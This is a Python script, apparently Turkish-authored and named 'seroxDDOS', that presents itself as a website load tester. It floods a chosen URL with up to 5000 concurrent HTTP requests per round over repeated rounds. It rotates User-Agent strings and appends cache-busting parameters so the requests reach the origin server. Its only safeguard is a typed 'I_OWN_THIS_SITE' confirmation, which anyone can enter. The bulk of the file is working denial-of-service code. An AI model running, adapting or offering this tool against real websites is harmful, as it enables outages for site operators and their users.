#!/usr/bin/env python3
# seroxDDOS_fixed.py
"""
Serox load tester — daha dayanıklı bootstrap ile.
ÖNEMLİ: Yalnızca sahibi olduğun veya açıkça izin verilen sitelerde test et.
"""

import sys
import subprocess
import importlib
import traceback
import shlex
from typing import List

# --------- bootstrap: pip upgrade + prefer-binary install ----------
REQUIRED = ["aiohttp"]

def run_cmd(cmd: List[str]) -> int:
    """Cmd çalıştır, stdout/stderr konsola yönlendir, dönüş kodunu döndür."""
    print("Çalıştırılıyor:", " ".join(shlex.quote(x) for x in cmd))
    try:
        proc = subprocess.run(cmd, check=False)
        return proc.returncode
    except Exception as e:
        print("Komut çalıştırılırken beklenmeyen hata:", e)
        traceback.print_exc()
        return 1

def ensure_packages(packages: List[str]) -> bool:
    missing = []
    for pkg in packages:
        try:
            importlib.import_module(pkg)
        except Exception:
            missing.append(pkg)

    if not missing:
        print("Tüm bağımlılıklar mevcut.")
        return True

    py = sys.executable

    # 1) pip upgrade (zorlayıcı değil, hatayı yoksaydık da devam ederiz)
    print("pip güncelleniyor (deneme)...")
    rc = run_cmd([py, "-m", "pip", "install", "--upgrade", "pip"])
    if rc != 0:
        print("pip upgrade başarısız oldu ama devam denenecek (zorunlu değil).")

    # 2) Önce --prefer-binary ile dene (derleme gerektiren durumları azaltır)
    print("Eksik paketler tespit edildi:", missing)
    print("Önce --prefer-binary ile yüklemeyi deniyorum (daha hızlı wheel kullanma şansı).")
    rc = run_cmd([py, "-m", "pip", "install", "--prefer-binary"] + missing)
    if rc == 0:
        # doğrula import
        ok = True
        for pkg in missing:
            try:
                importlib.import_module(pkg)
            except Exception as e:
                print(f"'{pkg}' import edilemedi: {e}")
                ok = False
        if ok:
            print("Paketler başarıyla kuruldu (prefer-binary).")
            return True
        print("prefer-binary ile kurulsa da import doğrulaması başarısız oldu, tekrar denenecek.")

    # 3) fallback: normal pip install (derleme gerekebilir)
    print("Prefer-binary başarısız ya da yetersiz kaldı. Normal pip install ile tekrar deniyorum (derleme gerekebilir).")
    rc = run_cmd([py, "-m", "pip", "install"] + missing)
    if rc == 0:
        ok = True
        for pkg in missing:
            try:
                importlib.import_module(pkg)
            except Exception as e:
                print(f"'{pkg}' import edilemedi: {e}")
                ok = False
        if ok:
            print("Paketler başarıyla kuruldu (normal install).")
            return True
        print("Normal install sonrası import doğrulaması başarısız oldu.")

    # 4) tüm denemeler başarısızsa, kullanıcıya açıklayıcı mesaj ver
    print("\n‼️ Paket kurulumu başarısız oldu. Olası sebepler:")
    print("- Python sürümün çok yeni (örn. 3.13) ve prebuilt wheel yok -> derleme gerekiyor.")
    print("- Derleme için gerekli araçlar yok (Windows için: Microsoft Visual C++ Build Tools).")
    print("- İnternet kesintisi veya pip izin problemi.")
    print("\nNe yapabilirsin:")
    print(f"1) Visual C++ Build Tools yükle: https://visualstudio.microsoft.com/visual-cpp-build-tools/")
    print(f"2) Daha uyumlu Python sürümüne geç (örn. Python 3.11 veya 3.12).")
    print(f"3) Manuel kurmayı dene (komut):\n   {py} -m pip install --prefer-binary {' '.join(packages)}")
    print(f"4) Virtualenv kullanıyorsan, venv'i aktif edip tekrar dene.")
    print("\nHata detayları (trace):")
    traceback.print_exc()
    input("\nDevam etmek için Enter'a bas (script kapanmayacak).")
    return False

# çalıştır
try:
    ok = ensure_packages(REQUIRED)
except Exception as e:
    print("Bağımlılık kontrolünde beklenmeyen hata:", e)
    traceback.print_exc()
    ok = False

if not ok:
    print("Gerekli bağımlılıklar kurulamadı veya doğrulanamadı. Program sonlandırılıyor.")
    input("Çıkmak için Enter'a bas.")
    sys.exit(1)

# --------- Artık ana program (load tester) ---------
import asyncio
import aiohttp
import random
import time
import csv
from urllib.parse import urlparse
from collections import Counter
from datetime import datetime, timezone

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

BANNER = r"""
 ____  _____  ____  ____  __  __  _____
/ ___|| ____||  _ \|  _ \|  \/  |/ ____|
\___ \|  _|  | |_) | |_) | |\/| | (___      - Load tester PRO v2
 ___) | |___ |  _ <|  _ <| |  | |\___ \
|____/|_____||_| \_\_| \_\_|  |_|_____)]
"""

MAX_CONCURRENCY = 5000

def safe_hostname_check(url: str):
    try:
        p = urlparse(url)
        if not p.scheme:
            return False, "URL şemasız (http/https yaz)."
        if not p.netloc:
            return False, "Geçersiz URL."
        return True, p.netloc
    except Exception as e:
        return False, str(e)

async def worker(session: aiohttp.ClientSession, sem: asyncio.Semaphore, url: str, idx: int, cache_bust: bool):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    target = url
    if cache_bust:
        sep = "&" if "?" in url else "?"
        target = f"{url}{sep}_={time.time_ns()}"

    async with sem:
        t0 = time.monotonic()
        try:
            async with session.get(target, headers=headers, timeout=30) as resp:
                body = await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                size = len(body)
                status = resp.status
                print(f"[T-{idx}] {status} — {size} bytes — {elapsed_ms:.1f} ms")
                return {"idx": idx, "status": status, "bytes": size, "ms": elapsed_ms, "error": ""}
        except Exception as e:
            elapsed_ms = (time.monotonic() - t0) * 1000
            print(f"[T-{idx}] ERROR: {e} — {elapsed_ms:.1f} ms")
            return {"idx": idx, "status": None, "bytes": 0, "ms": elapsed_ms, "error": str(e)}

async def run_round_shared_session(url: str, concurrency: int, cache_bust: bool):
    conn = aiohttp.TCPConnector(limit_per_host=concurrency)
    sem = asyncio.Semaphore(concurrency)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [asyncio.create_task(worker(session, sem, url, i+1, cache_bust)) for i in range(concurrency)]
        results = await asyncio.gather(*tasks, return_exceptions=False)
        return results

def print_menu():
    print("\n" + BANNER)
    print("1) Normal: siteye tek istek gönder")
    print("2) Turbo: n eşzamanlı istek gönder (rounds ile tekrarlama opsiyonu ve en fazla 5000)")
    print("3) Çıkış")

def require_ownership_confirmation():
    print("\nDİKKAT: Bu aracı SADECE sahibi/izinli olduğun sitelerde kullan.")
    ok = input("Eğer site SENİNSE ve devam etmek istiyorsan lütfen tam olarak yaz: I_OWN_THIS_SITE\n> ").strip()
    if ok != "I_OWN_THIS_SITE":
        print("Onay alınmadı — çıkılıyor.")
        sys.exit(1)

def safe_int_input(prompt, default):
    v = input(prompt).strip()
    if not v:
        return default
    try:
        return int(v)
    except:
        print("Geçersiz sayı, varsayılan kullanılacak.")
        return default

def summarize_and_save(all_results, url, total_duration_s):
    flat = [r for batch in all_results for r in batch]
    total = len(flat)
    statuses = [r["status"] for r in flat if r.get("status") is not None]
    bytes_list = [r["bytes"] for r in flat]
    times = [r["ms"] for r in flat if r.get("ms") is not None]
    counter = Counter(statuses)
    ok_count = counter.get(200, 0)
    avg_ms = (sum(times) / len(times)) if times else 0
    min_ms = min(times) if times else 0
    max_ms = max(times) if times else 0
    total_bytes = sum(bytes_list)

    print("\n--- TEST ÖZETİ ---")
    print(f"URL: {url}")
    print(f"Süre (toplam): {total_duration_s:.2f} s")
    print(f"Toplam istek: {total}")
    print(f"200 OK: {ok_count}")
    print("Status dağılım:", dict(counter))
    print(f"Toplam veri: {total_bytes} bytes")
    print(f"Latency (avg/min/max): {avg_ms:.1f} ms / {min_ms:.1f} ms / {max_ms:.1f} ms")
    print("------------------")

    stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    fname = f"results-{stamp}.csv"
    with open(fname, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["round", "idx", "status", "bytes", "ms", "error"])
        writer.writeheader()
        for r_index, batch in enumerate(all_results, start=1):
            for row in batch:
                writer.writerow({
                    "round": r_index,
                    "idx": row.get("idx"),
                    "status": row.get("status"),
                    "bytes": row.get("bytes"),
                    "ms": f"{row.get('ms'):.3f}" if row.get("ms") is not None else "",
                    "error": row.get("error", "")
                })
    print(f"Detaylar '{fname}' olarak kaydedildi.")

async def turbo_flow(url, concurrency, rounds, delay_ms, cache_bust):
    all_results = []
    t0 = time.monotonic()
    for r in range(rounds):
        print(f"\n--- ROUND {r+1}/{rounds} ---")
        try:
            results = await run_round_shared_session(url, concurrency, cache_bust)
        except Exception as e:
            print("Round çalışırken hata:", e)
            results = [{"idx": i+1, "status": None, "bytes": 0, "ms": 0, "error": str(e)} for i in range(concurrency)]
        succ = sum(1 for x in results if x.get("status") == 200)
        err = sum(1 for x in results if x.get("status") is None)
        rate_limited = sum(1 for x in results if x.get("status") == 429)
        print(f"Round tamamlandı — success:{succ}, 429:{rate_limited}, errors:{err}")
        all_results.append(results)
        if r != rounds-1 and delay_ms > 0:
            await asyncio.sleep(delay_ms / 1000.0)
    duration = time.monotonic() - t0
    return all_results, duration

def main():
    print(BANNER)
    if len(sys.argv) > 1:
        url = sys.argv[1].strip()
        print("Kullanılan URL (komut satırı):", url)
    else:
        url = input("Test edilecek URL (örnek: https://example.com/): ").strip()

    ok, info = safe_hostname_check(url)
    if not ok:
        print("Geçersiz URL:", info)
        return

    require_ownership_confirmation()

    while True:
        print_menu()
        choice = input("Seçimin (1/2/3): ").strip()
        if choice == "1":
            print("[serrms] Normal mod başlatılıyor...")
            try:
                all_results, duration = asyncio.run(turbo_flow(url, 1, 1, 0, False))
                summarize_and_save(all_results, url, duration)
            except KeyboardInterrupt:
                print("\nİptal edildi.")
        elif choice == "2":
            concurrency = safe_int_input("Kaç paralel istek atacaksın? (Enter = 5000): ", 10)
            if concurrency < 1:
                print("En az 1 olmalı. Ayarlandı -> 1")
                concurrency = 1
            elif concurrency > MAX_CONCURRENCY:
                print(f"Maksimum concurrency {MAX_CONCURRENCY} ile sınırlandırıldı.")
                concurrency = MAX_CONCURRENCY

            rounds = safe_int_input("Kaç tekrar (round) yapalım? (Enter = 1): ", 1)
            delay_ms = safe_int_input("Round'lar arası bekleme (ms, Enter = 0): ", 0)
            cache_bust_in = input("Cache-bypass eklensin mi? (y/N): ").strip().lower()
            cache_bust = cache_bust_in == "y"

            print(f"[serrms] Turbo mod başlatılıyor: concurrency={concurrency}, rounds={rounds}, delay={delay_ms}ms, cache_bust={cache_bust}")
            try:
                all_results, duration = asyncio.run(turbo_flow(url, concurrency, rounds, delay_ms, cache_bust))
                summarize_and_save(all_results, url, duration)
            except KeyboardInterrupt:
                print("\nİptal edildi (Ctrl+C).")
        elif choice == "3":
            print("Çıkılıyor. Görüşürüz kral.")
            break
        else:
            print("Geçersiz seçim, tekrar dene.")

if __name__ == "__main__":
    main()



